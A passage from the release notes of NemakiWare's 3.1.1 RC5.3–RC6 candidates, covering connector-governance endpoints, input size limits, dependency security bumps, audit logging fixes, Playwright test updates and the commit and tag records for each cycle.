  in `allowedPrincipalIds`
- `perMemberImpact[]` — for each member (within `memberLimit`),
  the connectors they would lose if the group were removed from
  their effective principal set (sole-route detection per member)
- `perMemberImpactTruncated` — true iff `includeMembers=true` and
  member list was capped; false on the fast `includeMembers=false`
  path (semantically "didn't attempt expansion", not "truncated
  it")

Server hard cap `MAX_MEMBER_LIMIT = 1000` clamps abusive query
params. Response shape always includes every field (review L) so
the UI doesn't need defensive null checks.

UI: `ConnectorGovernanceTab` adds a Radio toggle (Principal mode
/ Group membership impact mode). Each mode owns its own Form +
result state so switching modes doesn't lose context. Group mode
renders direct grants + per-member impact in two inner Cards;
includeMembers Switch + memberLimit InputNumber (max 1000)
control the per-member computation.

i18n: 22 new keys added to ja + en
(`modeLabel`/`modePrincipal`/`modeGroup`/`groupPlaceholder`/
`groupSummary`/`groupMembersShowing`/`groupMembersTruncated`/
`directGrantsTitle`/`directGrantsEmpty`/`perMemberImpactTitle`/
`perMemberImpactHint`/`perMemberImpactEmpty`/`perMemberLostCount`/
`perMemberKept`/`colUserId`/`colLost`/...).

Tests: 27/27 `ConnectorByPrincipalGovernanceTest` (was 13;
B3-2 +9, review M +1, L2 +2, M3 +2). 5/5 server-contract
Playwright in `connector-governance-by-group.spec.ts`
(stable-shape, memberLimit clamp, missing groupId/repositoryId,
graceful anonymous).

### V8/G2: principal picker scale-out for 10k+ directories

The shared principal AutoComplete is now production-ready for
large directories:

- `fetchPrincipals(query, kinds)` accepts a kinds array; group
  mode passes `['GROUP']`, halving the per-keystroke network
  cost and rendered DOM compared to fetching both users and
  groups.
- **offset=0 fix**: previous `limit=50` alone made the server
  fall back to "return all" (the paginated branch requires both
  offset and limit). Verified against the dev bedroom repo —
  `/user/list?offset=0&limit=50` now returns 50/112 instead of
  112/112.
- `totalCount` from the response surfaces in a dropdown footer
  ("{loaded} of {total} loaded") with a warning when
  `total > loaded` ("narrow the search to find more").
- Initial fetch deferred until first dropdown open
  (`onDropdownVisibleChange`) — operators who never expand the
  picker pay no network cost.
- Mode-aware footer + groupOnlyOptions memoisation.

### Dependabot security pass (35 alerts surveyed, 12 real)

Maven (10 alerts, all real):

- `org.springframework:spring-webmvc` 7.0.5 → 7.0.7
  (DoS / Script View Templates / cache poisoning / SSE corruption)
- `ch.qos.logback:logback-core` + `logback-classic` 1.5.19 →
  1.5.25 across `core/pom.xml`, `solr/pom.xml`,
  `docker/solr/pom.xml` (ACE through file processing + class
  instantiation)
- `org.apache.commons:commons-lang3` 3.17.0 → 3.18.0 in
  `solr/pom.xml` and `docker/solr/pom.xml` (uncontrolled
  recursion)

npm (25 alerts, 2 real):

- `npm audit` against the actual RC6 lockfile reported only 2
  vulnerabilities (brace-expansion 5.0.5→5.0.6 DoS, ws <8.20.1
  uninitialized memory). Both resolved by `npm audit fix`
  without overrides.
- The other 23 Dashboard alerts were stale against the master
  branch's older lockfile (axios 1.6→1.15.2 series, vite, lodash,
  dompurify, etc. are already at or above patched versions).
  Dashboard counter will catch up on master merge.

Verified `npm audit` = 0 vulnerabilities post-fix.

### H2: Simulate (audit) button Playwright coverage

The RC5.4 R3 button — explicit "Record to audit" instead of the
prior 800ms debounce — previously had only Java unit coverage
(`ConnectorSimulateRemoveTest`). New
`connector-governance-simulate-button.spec.ts` adds 9 cases:

- 7 server contract (sole-route detection user+group, both-routes
  lost, missing/empty/oversized body validation, graceful
  anonymous)
- 1 UI happy path (login → governance tab → look up → select
  expanded principal → click button → audit POST fires + 200
  → button transitions to disabled "Audited" state)
- 1 additional M2 contract test (see below)

The spec documents several AntD + React 19 + 17-tab pitfalls in
comments so future test authors don't re-discover them:
`data-node-key` click flips header [active] without mounting
the panel (rely on governance card title visibility as the
authoritative ready signal); antd `allowClear` binds Escape to
clear-input (use Enter + button click); Look up button
accessible name is "search 検索" (icon name prepended); multi-
select virtualises options (target first option, not specific
group ID); viewport widened to 1600x900 to keep all 17 tabs in
the visible tab bar.

### M2: simulate-remove body size limits

`POST /by-principal/{id}/simulate-remove` now enforces:

- `MAX_REMOVE_PRINCIPAL_IDS = 500` — inbound array count cap,
  validated BEFORE the per-entry loop allocates the
  LinkedHashSet. 501+ → 400 with named limit;
  `connectorDefinitionService.list()` never called.
- `MAX_PRINCIPAL_ID_LENGTH = 512` — per-entry string length cap.
  Rejects the whole request rather than silently dropping the
  offender so the caller notices.

Real "what if I remove these groups" simulations involve dozens
of principals at most. The endpoint is admin-only; these limits
are defence in depth against a compromised admin token.

Tests: 15/15 `ConnectorSimulateRemoveTest` (was 11; M2 +4 covers
both boundaries — 500 OK, 501 reject, 512 OK, 513 reject).

### M3: buildMatches per-request connector caching

`listByGroup` previously called
`connectorDefinitionService.list()` once per member
(perMemberImpact loop) + once for directGrants — up to 201 calls
per request at `memberLimit=200`. RC6:

- New `buildMatches(principalId, principalsToMatch, connectors)`
  overload accepts a pre-fetched list; the existing 2-arg
  overload delegates to it.
- `listByGroup` caches `allConnectors` at method-head scope and
  shares the list across directGrants + every member iteration.
  list() invocations now exactly 1 per request, regardless of
  member count.
- Inner-loop direction optimisation: iterate the smaller of
  `allowed` (per-connector grants, typically 1-5) and
  `principalsToMatch` (expanded user, often 50+); HashSet
  contains() on the larger side. Same matched set, faster
  constant factor.

Tests: 2 new (`byGroup_perRequestConnectorListIsFetchedExactlyOnce_M3`
pins list() count = 1 across 25 members;
`byPrincipal_singleListCallPerRequest_M3_regressionGuard` pins
the legacy single-call path).

### L1 / L2 nit cleanups

- **L1** (UI): `simulateLastAuditedAt` reset useEffect now
  depends on `useMemo(() => simulateRemove.join(' '), …)` —
  content-stable dependency surviving a future
  memoised-array refactor.
- **L2** (server): `buildMatches` null-folds
  `connectorDefinitionService.list()` to an empty list →
  empty matches[]. No NPE on a transient backend failure or
  future service impl swap.

Tests: 2 new L2 tests pin the null-defense on both
`/by-principal` and `/by-group` paths.

### Change scope vs RC5.6 (precise)

- **Changed in RC6**:
  - `core/src/main/java/jp/aegif/nemaki/rest/ingest/ConnectorDefinitionController.java`
    (B3-2 endpoint + review M cap + L stable shape, M2 size
    limits, M3 caching + overload + inner-loop opt, L2 null fold)
  - `core/src/test/java/jp/aegif/nemaki/rest/ingest/ConnectorByPrincipalGovernanceTest.java`
    (+14 cases: B3-2 9, review M 1, M3 2, L2 2)
  - `core/src/test/java/jp/aegif/nemaki/rest/ingest/ConnectorSimulateRemoveTest.java`
    (+4 M2 cases)
  - `core/src/main/webapp/ui/src/services/externalIngest.ts`
    (`getConnectorsByGroup` + types)
  - `core/src/main/webapp/ui/src/components/IntegrationSettings/ConnectorGovernanceTab.tsx`
    (group mode toggle + Form + result panel; V8/G2
    kinds-aware fetch + offset=0 + totalCount surfacing +
    deferred initial fetch; L1 useEffect dep stability)
  - `core/src/main/webapp/ui/src/i18n/locales/{ja,en}.json`
    (24 new keys — 22 group mode + 2 picker hints)
  - `core/src/main/webapp/ui/tests/admin/connector-governance-by-group.spec.ts`
    (new, 5 cases)
  - `core/src/main/webapp/ui/tests/admin/connector-governance-simulate-button.spec.ts`
    (new, 9 cases — H2 + M2)
  - `core/pom.xml`, `solr/pom.xml`, `docker/solr/pom.xml`
    (Maven security bumps)
  - `core/src/main/webapp/ui/package-lock.json` (npm audit fix)
  - `docs/design/connector-delegation.md` (§12.16, §12.17 renumber)
  - `CLAUDE.md`, `REVIEW_PACKET.md`, `RELEASE_NOTES.md` (this section)
- **Unchanged from RC5.6** (byte-equal):
  - Scheduler core (RC5 §12.1) + RC5.4 R3/R4 + RC5.5 C1/H1
  - `AuditOperation`, `DenialReason` enums (no new entries)
  - `nemakiware.properties`, `serviceContext.xml`
  - Patch / view dumps / Mango index / DB bootstrap
  - Existing single-call endpoints (`/by-principal/{id}`,
    `simulate-remove` happy path) — response shapes are
    byte-identical

### Commit + tag relationship

- B3-2 server commit: `15936c6b3`
- B3-2 review M+L commit: `7f31c1d64`
- B3-2 UI commit: `ca8295b39`
- V8/G2 commit: `507d65253`
- Maven security commit: `9204d3a95`
- npm security commit: `9ea197c9a`
- H2 spec commit: `581694272`
- M2 commit: `06ac804cd`
- M3 commit: `82012a221`
- L1+L2 commit: `8db0eb254`
- **`v3.1.1-RC6` annotated tag target**: see
  `git rev-parse v3.1.1-RC6^{}` after the tag is cut against
  the doc commit immediately following this section

Previous candidates (`v3.1.1-RC5.6`, `…-RC5.5`, `…-RC5.4`, etc.)
remain unchanged as historical milestones.

### Tests + verification

- 27/27 ConnectorByPrincipalGovernanceTest pass (was 13)
- 15/15 ConnectorSimulateRemoveTest pass (was 11)
- 129/129 across the 9 governance + scheduler Java test classes
- 66/66 full RC5/RC6 Playwright regression
- `npm audit` = 0 vulnerabilities
- TypeScript clean + UI build green
- Live: B3-2 endpoint validated against the dev bedroom repo's
  39-member `cloud-google:a13@aegif.jp` group with memberLimit=5
  (correct truncation flags); M2 boundaries (501/513 → 400 with
  named limits, 500/512 → 200) live-verified; M3 collapsed
  N+1 list() calls to 1 (confirmed via mockito.verify in
  ConnectorByPrincipalGovernanceTest)

### Follow-up status (cumulative across RC5+RC6 cycle)

**Resolved in this RC**: B3-2, V8/G2, H2, M2, M3, L1, L2,
Dependabot Maven 10, Dependabot npm 2 real (23 stale
dashboard alerts resolve on master merge).

**Remaining** (post-release / RC7+ candidates, not blocking
external review):

- **R1** (Low, ops, NemakiWare repo external) — SOC tooling
  integration for `EXTERNAL_GOVERNANCE_SIMULATE` audit event.
  Query / alert template work that lives in the operator
  monitoring stack, not in this repository.

---

## 3.1.1-RC5.6 — R5 denialReason accuracy + A2 spec CSRF cleanup
_Release candidate on `release/3.1.1-RC5.5` (2026-05-21), branched
off `v3.1.1-RC5.5` (`dfb912da9`)._

Post-RC5.5 cumulative cleanup. RC5.5 shipped with R5 (the last
remaining cumulative follow-up from RC5.4) still open; RC5.6 closes
it and extends RC5.5's Playwright spec CSRF fix to the rest of the
repository. No public API contract change, no DB / patch / view /
migration change. The RC5.5 tag (`dfb912da9`) is **not force-updated**
and remains as a historical milestone.

### R5: scheduler audit denialReason accuracy

`IngestSchedulerService.pollScheduledProfiles` previously inlined
the second `resolveFolderId(...)` call into the connector delegation
re-check. When that call returned null (folder deleted, ACL revoked,
or transient lookup failure between scheduler ticks), the
authorization check returned `false` and the audit recorded
`denialReason=CONNECTOR_NOT_DELEGATED` — safety preserved, label
wrong. RC5.6 extracts `resolveFolderId(...)` into a local first; a
null result emits `denialReason=TARGET_FOLDER_UNRESOLVABLE` (matches
the shape already used in `prepareDelegatedTick` step 5), then the
non-null result flows into the connector check as before.

2 new unit tests pin the behaviour:
- `targetFolderDisappearsBetweenTicks_emitsTargetFolderUnresolvable_notConnectorNotDelegated`
- `targetFolderResolves_butConnectorNoLongerDelegated_stillEmitsConnectorNotDelegated`
  (regression guard for the legitimate `CONNECTOR_NOT_DELEGATED` path)

### A2: repository-wide spec CSRF cleanup

RC5.5 fixed CSRF headers in 3 RC5-area spec files. RC5.6 audited
all 43 specs that issue state-changing requests and found only 2
additional files actually needed the fix — Jersey-served
`/core/api/v1/cmis/*` paths and CMIS Browser Binding
`/core/browser/*` are CSRF-exempt at the servlet level. Added
`X-Requested-With: XMLHttpRequest` to:

- `tests/admin/integration-settings.spec.ts` (12 PUT/POST sites on
  `/core/api/v1/admin/integration-settings/*`)
- `tests/admin/purview-atlas-e2e.spec.ts` (7 POST/PUT sites on
  `/core/api/v1/admin/{purview,integration-settings,lineage-journal}/*`)

While in `integration-settings.spec.ts`, two pre-existing test drift
items were resolved as well:

- Stale tab count: expected 15 → actual 17 (RC5.1 added
  `connector-governance`, later RC added `mcp`). Test renamed and
  assertion updated.
- Loose `/Connector|コネクタ/i` regex would match both the
  `Connectors` management tab and the `Connector Access` governance
  tab — masking a regression where the management tab disappears
  but the governance tab still satisfies the assertion. Replaced
  with the anchored `/^(コネクタ ベータ|Connectors\s+Beta)$/`
  pattern already used in `connector-profile-management.spec.ts`.

Also folds in `7f4b268ba` (the RC5.5 post-tag Playwright E2E
fix — CSRF header + serial mode + tab selector + valid
sourceSystem in the 3 RC5-area spec files). RC5.5 cut its tag
before that commit landed; RC5.6 includes it in the canonical
artifact.

### Change scope vs RC5.5 (precise)

- **Changed in RC5.6**:
  - `core/src/main/java/jp/aegif/nemaki/rest/ingest/IngestSchedulerService.java`
    (R5 — extract `resolveFolderId` local, add `TARGET_FOLDER_UNRESOLVABLE`
    early-return branch)
  - `core/src/test/java/jp/aegif/nemaki/rest/ingest/IngestSchedulerDelegatedRunTest.java`
    (+2 R5 unit tests, +1 ArgumentCaptor import, +AuditLogger mock wiring)
  - `core/src/main/webapp/ui/tests/admin/integration-settings.spec.ts`
    (CSRF header on 12 sites + tab count 15→17 + tab regex anchored)
  - `core/src/main/webapp/ui/tests/admin/purview-atlas-e2e.spec.ts`
    (CSRF header on 7 sites)
  - `core/src/main/webapp/ui/tests/api/ingest-pipeline-e2e.spec.ts`
    (RC5.5 follow-up: serial mode + CSRF header + sourceSystem `e2e_test`→`box`/`google_drive`)
  - `core/src/main/webapp/ui/tests/api/external-ingest-api.spec.ts`
    (RC5.5 follow-up: serial mode + CSRF header)
  - `core/src/main/webapp/ui/tests/admin/connector-profile-management.spec.ts`
    (RC5.5 follow-up: CSRF header + anchored tab selector)
  - `docs/design/connector-delegation.md` §12.14 (new) / §12.15 (renumbered vNext)
  - `CLAUDE.md` (RC5.6 section)
  - `REVIEW_PACKET.md` (rewrite as RC5.6 packet)
  - `RELEASE_NOTES.md` (this section)
- **Unchanged from RC5.5** (byte-equal):
  - All other product code (controllers, services, factories, audit
    pipeline, scheduler-other paths, governance V3 endpoint, W1/W2
    endpoints, RC5 §12.1 scheduled-delegated machinery)
  - `AuditOperation` / `DenialReason` enums (no new entries)
  - `nemakiware.properties`, `serviceContext.xml`
  - Patch / view dumps / Mango index / DB bootstrap
  - UI shipped components (only test files changed)

### Commit + tag relationship

- **R5 feature commit**: `cee66573e`
- **A2 spec CSRF cleanup commit**: `dc0ba6dac`
- **RC5.5 post-tag Playwright E2E follow-up**: `7f4b268ba`
- **Tab regex tightening (Low)**: in the RC5.6 doc commit
- **`v3.1.1-RC5.6` annotated tag target**: see `git rev-parse v3.1.1-RC5.6^{}`

The previous candidate `v3.1.1-RC5.5` is **not force-updated** and
remains at peeled commit `dfb912da9` as a historical milestone.

### Tests + verification

- 96/96 ingest-related Java tests pass
  (10 `IngestSchedulerDelegatedRunTest`, was 8 — R5 +2)
- 17/17 `integration-settings.spec.ts` (was 8 failed in RC5.5)
- 17 pass / 25 skip `purview-atlas-e2e.spec.ts` (skips are Atlas
  not configured in env, intentional)
- 35/35 RC5-area specs from RC5.5 still pass (no regression)

### Follow-up status (cumulative across RC5 cycle)

**Resolved in this RC**: R5, A2 (Playwright spec CSRF cleanup).

**Remaining** (post-release / RC5.7+ candidates, not blocking):

- **R1** (Low, ops) — SOC tooling integration for the
  `EXTERNAL_GOVERNANCE_SIMULATE` audit event.
- **H2** (Medium, test coverage) — R3 Simulate button has no
  Playwright / React test.
- **M2** (Medium, security hardening) — `simulate-remove` body
  size limit.
- **M3** (Low, scale) — `buildMatches` full-scan per call.
- **L1 / L2** — nit findings (UI ref-equality reset, server-side
  null check defensiveness).

---

## 3.1.1-RC5.5 — External-review C1 blocker fix + H1/M1/M4 cleanups
_Release candidate on `release/3.1.1-RC5.5` (2026-05-20), branched
off `release/3.1.1-RC5.4` HEAD `8629782bb` (the post-RC5.4-closure
branch state, with all RC5.4 doc commits included)._

Correction cycle from the **first external-review round** that
targeted `v3.1.1-RC5.4`. The reviewer surfaced one blocker (C1)
plus three recommendations (H1, M1, M4); RC5.5 addresses all four.

### C1: epoch overflow → HTTP 400 (was 500)

`GET /v1/admin/import-profiles?autoDisabledSince=` with an
ISO-8601 instant that parses successfully but overflows Long
range on `toEpochMilli()` (e.g. `+999999999-12-31T23:59:59Z`) used
to return HTTP 500. RC5.4 only caught `DateTimeParseException`;
RC5.5 also catches `ArithmeticException` for both the cutoff
parse and the per-profile marker parse:

- Cutoff overflow → controller returns **HTTP 400** (R4 strictness
  contract now holds for both DateTimeParseException AND overflow).
- Profile-side overflow on `lastAutoDisabledAt` → defensive exclude
  (one corrupted record no longer 500s the whole list response).

2 new unit tests pin the behaviour:
- `epochOverflowCutoff_returns400_C1_RC5_5`
- `profileWithEpochOverflowMarker_isExcluded_listStillReturns200_C1_RC5_5`

`ImportProfileSinceFilterTest` total: 8 → 10 cases.

### H1: silent audit catch → safeEmit helper

The five `catch (RuntimeException ignored)` audit emit sites in
the RC5 cycle (3 in `ImportProfileDefinitionController`, 1 in
`ConnectorDefinitionController`, 1 in
`ExternalIngestController`, 1 in `IngestSchedulerService`) are
collapsed to `jp.aegif.nemaki.audit.AuditEmitSupport.safeEmit(...)`
which:

- Preserves the original invariant: audit failure must never
  break the business path.
- Logs a WARN line on failure with `op + actor + object +
  exceptionClass + exceptionMessage`.
- Deliberately does NOT log the audit `details` map. The details
  map can contain principal lists, internal IDs, and other
  audit-only fields; keeping it out of the general application
  log preserves audit's segregation contract and avoids
  secret / token / credential leakage into less-protected
  logging sinks.

The 2 `catch (RuntimeException ignored)` in
`resolvePrincipalType` are unchanged — they are deliberate
fall-through logic (USER → GROUP → UNKNOWN), not audit-related.

Net audit silent catches in RC5 area: 5 → 0.

### M1: REVIEW_PACKET.md test evidence precision

Replaces bare "155 / 155 ingest delegation tests PASS" with two
explicit scopes:

- **Focused 14 test classes / 157 tests** (RC5.5 includes the C1 +2).
  Explicit class list documented.
- **Broader pattern** `*Ingest*Test*,*Connector*Test*,*Profile*Test*,Delegated*Test`
  returned **287 tests** all PASS at the RC5.4 closure review;
  not re-run for RC5.5 because RC5.5 only touches files inside
  the focused set.

### M4: design doc historical section strikethrough

`docs/design/connector-delegation.md` §12.6 and §12.9 (the
historical post-RC5 / post-RC5.1 follow-up lists, whose items
all shipped in RC5.1 / RC5.2 respectively) now carry the
`~~strikethrough~~ (resolved in RC5.x)` treatment to match
§12.10 / §12.11 / §12.12 already-shipped sections.

### Change scope vs RC5.4 (precise)

- **Changed in RC5.5**:
  - `ImportProfileDefinitionController.applyAutoDisabledSinceFilter`
    (C1 — adds `ArithmeticException` to the catch alongside
    `DateTimeParseException` on both cutoff + profile paths)
  - 5 audit method bodies in 4 files → `safeEmit` helper calls (H1)
  - **NEW** `core/src/main/java/jp/aegif/nemaki/audit/AuditEmitSupport.java` (H1)
  - `ImportProfileSinceFilterTest` (+2 C1 tests)
  - `REVIEW_PACKET.md` (M1)
  - `docs/design/connector-delegation.md` (M4 + RC5.5 §12.13)
  - `CLAUDE.md` (RC5.5 section)
  - `RELEASE_NOTES.md` (this section)
- **Unchanged from RC5.4** (byte-equal, accumulated zero diff):
  - Scheduler core, governance V3 endpoint, W2 simulate-remove
    endpoint, W1 query param, V1 marker handshake, V4-V8 UI logic,
    R3 audit button.
  - `AuditOperation` enum (no new entries since RC5.3).
  - `DenialReason` enum (no new entries since RC5).
  - `nemakiware.properties`, `serviceContext.xml`.
  - Patch / view dumps / Mango index / DB bootstrap.

### Commit + tag relationship

- **C1 + H1 feature commit**: `9bb5bcf83`
- **Pre-tag doc closure commit** (status flip 進行中 → shipped): `dfb912da9`
- **`v3.1.1-RC5.5` annotated tag target**: `dfb912da9`
- **Annotated tag object SHA**: `bd967193da1f522dc9fed47a24b8c2febfd5fdba`

The previous candidate `v3.1.1-RC5.4` is **not force-updated**
and remains at peeled commit `014939eeb` as a historical
milestone.

### Tests + verification

- 157/157 focused ingest tests pass (was 155 — C1 +2)
- TypeScript check + UI build pass
- `/core/ui/dist/` forbidden path: 0 hit cumulative
- Live C1: 4-case curl confirms 400 / 400 / 200 / 200
- Live C1: corrupted profile marker → that profile excluded, list 200

### Follow-up status (cumulative across RC5 cycle)

**Remaining** (post-release / RC5.6+ candidates, not blocking
external re-review):

- **R1** (Low, ops) — SOC tooling integration for the
  `EXTERNAL_GOVERNANCE_SIMULATE` audit event.
- ~~**R5** (Low, audit label) — denialReason mislabel race in
  `IngestSchedulerService` connector re-check.~~ **Resolved in RC5.6
  (`cee66573e`).**
- **H2** (Medium, test coverage) — R3 Simulate button has no
  Playwright / React test.
- **M2** (Medium, security hardening) — `simulate-remove` body
  size limit.
- **M3** (Low, scale) — `buildMatches` full-scan per call.
- **L1 / L2** — nit findings (UI ref-equality reset, server-side
  null check defensiveness).

**Resolved in this RC**: C1, H1, M1, M4.

---

## 3.1.1-RC5.4 — R3 + R4 closure review code corrections
_Release candidate on `release/3.1.1-RC5.4` (2026-05-20), branched
off `release/3.1.1-RC5.3` HEAD `01fe84ac5` (RC5.3 closure
correction doc commit included)._

Code correction follow-up cycle for the two RC5.3 closure-review
findings the user opted to fix before external review. Both items
were post-release candidates in RC5.3 but accepted with caveat
documentation; RC5.4 elevates them to shipped fixes.

### R3: V7 audit fires on explicit button instead of 800ms debounce

`ConnectorGovernanceTab` removes the RC5.3 `useEffect`-driven
debounce that fired `simulate-remove` 800 ms after the multi-select
settled. Replaced with an explicit `Simulate (audit)` button next
to the simulate `Clear` button. Click → exactly one audit entry
recorded, 1:1 mapping to "an admin deliberately asked this
question". The button disables after firing and re-enables when
the selection changes (so repeated audit of the same query is
gated behind a state change). Client-computed display is unchanged —
the table filter is still instant, only the audit-trail trigger
moved from automatic to deliberate.

SOC tooling consumers can now treat each `EXTERNAL_GOVERNANCE_SIMULATE`
audit entry as a high-signal event (intentional operator query)
rather than a low-signal event (UI side-effect of multi-select
traversal).

### R4: `autoDisabledSince` malformed → 400 BAD_REQUEST

`applyAutoDisabledSinceFilter` now throws `IllegalArgumentException`
on unparseable ISO-8601 input; the controller catches and returns
HTTP 400. Empty / null params still pass through (treat as "no
filter requested") — only non-empty malformed values 400.

The closure review flagged the RC5.3 fail-safe pass-through as
risky: a typo in an admin diagnostic query returned the full list,
which an operator might briefly misread as "no recent shutdowns" =
"system healthy". The RC5.3 UI only ever ships `Date.toISOString()`
output, so the strictness doesn't affect the shipped flow; CLI /
scripting callers with malformed input now get an immediate 400
instead of a silently-full response.

### API contract impact

- **Backwards-compatible for callers shipping valid ISO-8601 or
  empty/missing `autoDisabledSince`** (the entire shipped UI flow).
- **Breaking only for non-empty malformed `autoDisabledSince`**:
  RC5.3 returned 200 + unfiltered list (with WARN log); RC5.4
  returns 400. This is the deliberate R4 strictness improvement.

### Tests

- `ImportProfileSinceFilterTest`: 8 cases (was 7 — `malformedCutoff`
  case rewritten as `malformedCutoff_returns400_R4Strictness` +
  new `emptyStringCutoff_stillTreatedAsAbsent_passThrough_evenWithR4`).
- Ingest delegation suite: **155 tests, all PASS** (was 154).
- TS check + UI build pass.

### Live verification

- R4: malformed query → HTTP 400 (was 200 in RC5.3) ✅
- R4: valid ISO → 200 ✅
- R4: empty param → 200 pass-through (unchanged) ✅
- R3: simulateAudit / simulateAudited / simulateAuditHint / simulateAuditFailed
  i18n keys all present in deployed bundle (3x each = ja + en + t() call) ✅
- W2 endpoint regression check: still returns lost/kept correctly ✅

### Change scope vs RC5.3 (precise)

Where exactly the RC5.4 cycle touched code, so external reviewers
can scope their review accurately:

- **Changed in RC5.4** (deliberate):
  - `ImportProfileDefinitionController` (Java) — R4 strictness:
    `applyAutoDisabledSinceFilter` throws `IllegalArgumentException`
    on malformed cutoff; `list()` catches → 400.
  - `ConnectorGovernanceTab.tsx` (UI) — R3 explicit audit button
    replaces the 800ms debounce useEffect; new state +
    `triggerSimulateAudit` callback.
  - `ImportProfileSinceFilterTest` — `malformedCutoff` test rewritten
    + new `emptyStringCutoff` test (155/155 PASS, was 154).
  - 4 new i18n keys (ja + en) for the R3 audit button states.
- **Unchanged from RC5.3** (verified zero diff):
  - `IngestSchedulerService` and `DelegatedCallContextFactory`
    (the scheduled delegated profile core)
  - `ConnectorDefinitionController` (governance V3 / W2 endpoints)
  - `AuditOperation` enum (no new entries since RC5.3)
  - `DenialReason` enum (no new entries since RC5.3)
  - `nemakiware.properties` (all 3 RC5 opt-in properties unchanged)
  - `serviceContext.xml` (no DI changes)
  - Patch / CouchDB view dumps / Mango index registration /
    DB bootstrap (`Patch_*`, `*_init.dump`, `Patch_IngestMangoIndexes`,
    `DatabasePreInitializer`, etc.) — accumulated zero diff
    since v3.1.1-RC4.1.

Phrased operationally: **RC5.4 changes one Java controller method,
one TSX component, one test class, and four i18n keys. Everything
else listed above is byte-equal to RC5.3.**

### Commit + tag relationship

- **R3 + R4 feature commit**: `6283afc96`
  (`feat(rc5.4): R3 + R4 closure review code corrections`)
- **Pre-tag doc closure commit** (status flip 進行中 → shipped):
  `014939eeb`
- **`v3.1.1-RC5.4` annotated tag target**: `014939eeb`
- **Annotated tag object SHA**: `d0a4a4f3d0f40482b0ca45cae47f75305235588b`

The annotated tag points at the pre-tag doc closure commit, not
the feature commit, by the project convention established in RC5
closure (doc closure included in the reviewed tag).

#### Post-tag supplemental docs (NOT in the tag)

After the tag was cut, additional documentation-only commits
landed on `release/3.1.1-RC5.4` branch HEAD. These do not modify
the shipped code artifact captured by `v3.1.1-RC5.4`. The current
list of files allowed to differ between tag and branch HEAD lives
in `REVIEW_PACKET.md` §3. External reviewers should treat:

- **Tag `v3.1.1-RC5.4` (peeled `014939eeb`)** as the code artifact
  under review.
- **Branch HEAD** as the review-time supplementary documentation,
  including this section and `REVIEW_PACKET.md`.

`REVIEW_PACKET.md` is the single-page entry point for external
reviewers and explicitly tracks this tag-vs-branch divergence.

### Follow-up status (cumulative across RC5 cycle)

**Remaining** (post-release / RC5.5+ candidates):

- **R1** (Low, ops) — SOC tooling integration for the
  `EXTERNAL_GOVERNANCE_SIMULATE` audit event. A query / alert
  template would let operators get notified on high-frequency
  simulate bursts. Not a release blocker; recorded so it isn't
  lost in the external-review handoff.
- ~~**R5** (Low, audit accuracy) —
  `IngestSchedulerService.pollScheduledProfiles` re-runs
  `IngestAuthorizationService.resolveFolderId(...)` when re-checking
  connector delegation for a delegated profile. If the second
  resolve returns `null` (microsecond-window race where the target
  folder was resolvable at `prepareDelegatedTick` time but
  unresolvable a few statements later), the audit's
  `denialReason` is `CONNECTOR_NOT_DELEGATED` when
  `TARGET_FOLDER_UNRESOLVABLE` would be more accurate.~~ **Resolved
  in RC5.6 (`cee66573e`)** — the second `resolveFolderId` result is
  now extracted into a local and null-checked before reaching
  `canUseConnectorForDelegatedProfileAsUser`; a null result emits
  `TARGET_FOLDER_UNRESOLVABLE` instead, matching `prepareDelegatedTick`
  step 5's existing shape.

**Resolved during RC5 cycle** (for completeness):

| ID | Resolution venue | Description |
|---|---|---|
| R2 | RC5.3 closure doc commit `01fe84ac5` | `docs/MULTI-REPLICA-DEPLOYMENT.md` updated with the new `nemakiware.ingest.delegated.*` properties + leader-failover streak-reset caveat |
| R3 | RC5.4 feature commit `6283afc96` | V7 audit fires on explicit "Simulate (audit)" button (was 800ms debounce) |
| R4 | RC5.4 feature commit `6283afc96` | `autoDisabledSince` malformed → HTTP 400 (was 200 pass-through with WARN) |

At RC5.4 closure: **outstanding follow-ups were R1 and R5; R5 is now resolved in RC5.6 (`cee66573e`).**
- R1 is infra/ops integration that lives outside this repository,
  not NemakiWare code work.
- R5 was a small denialReason-label refactor inside
  `IngestSchedulerService`; safety property was already preserved,
  only the emitted audit label was mislabeled in a microsecond race
  window. Not a release blocker at RC5.4. **Shipped in RC5.6
  (`cee66573e`).**

---

## 3.1.1-RC5.3 — W1 + W2 server-side governance scalability
_Release candidate on `release/3.1.1-RC5.3` (2026-05-20), branched
off `v3.1.1-RC5.2` (`e18e020f6`)._

First RC5.x cycle to **add Java code paths** since the RC5 base.
Resolves the W1 / W2 vNext items by pushing two pieces of work
server-side: V6's "auto-disabled within N days" filter and V7's
multi-principal removal simulation. Both are purely additive — RC5's
existing API response shapes and the existing endpoints are unchanged.

### W1: import-profiles `autoDisabledSince` filter

`GET /v1/admin/import-profiles?autoDisabledSince=ISO-8601` returns
only profiles whose `lastAutoDisabledAt` is `>= cutoff`. Profiles
without a marker are excluded.

**Malformed cutoff behaviour (documented trade-off)**: empty /
missing / unparseable ISO-8601 cutoff is **silently ignored** — the
filter is dropped and the unfiltered list is returned, with a WARN
in the server log. This preserves the no-param call shape (no
breaking change for old clients) and keeps the admin tab usable if
the UI ships a malformed value. The trade-off: a typo in an
admin-only diagnostic query returns the full list rather than 0,
which an operator might briefly misread as "no recent shutdowns" =
"everything looks fine". Because the endpoint is admin-only and the
intended UI driver only ever ships a `Date.toISOString()` value,
the misread risk is low. Operators who prefer strict 400 semantics
can request that change in a follow-up RC; the current behaviour is
deliberately permissive for backward compat.

The V6
UI window now ships the cutoff when both the "only auto-disabled"
filter and a non-zero window are active, so large-profile deployments
fetch only the relevant slice rather than filtering client-side.

### W2: `POST /by-principal/{principalId}/simulate-remove`

Admin-only endpoint that performs V5/V7's sole-route detection
server-side. Body shape:

```json
{
  "repositoryId": "bedroom",
  "expand": true,
  "removePrincipalIds": ["group-a", "group-b"]
}
```

Response partitions matches into `lost` (every matched principal lies
in the removal set — no alternate route) and `kept` (everything
else). Same logic the V7 UI computes client-side; the value is
**CLI / scripting access** + **audit trail**: each invocation logs an
`EXTERNAL_GOVERNANCE_SIMULATE` audit entry with the queried principal,
the removal set, and the lost count. SOC tooling can now correlate
"what-if" questions with subsequent group / ACL changes.

The V7 UI keeps its instant client-side computation for display
responsiveness, but fires the W2 endpoint debounced at 800 ms after
the multi-select settles. Audit captures the operator intent without
adding a round-trip to every keystroke.

**Audit noise trade-off (documented)**: a 5-principal selection
session in the UI typically produces 1 audit entry (the final
settled state after the user stops adjusting for 800 ms). A
power-user who toggles selection repeatedly within shorter windows
can produce more — each 800 ms quiet period after a change yields
one audit. Rough upper bound: one entry per second of active
multi-select tweaking. For SOC tooling consumers this is small
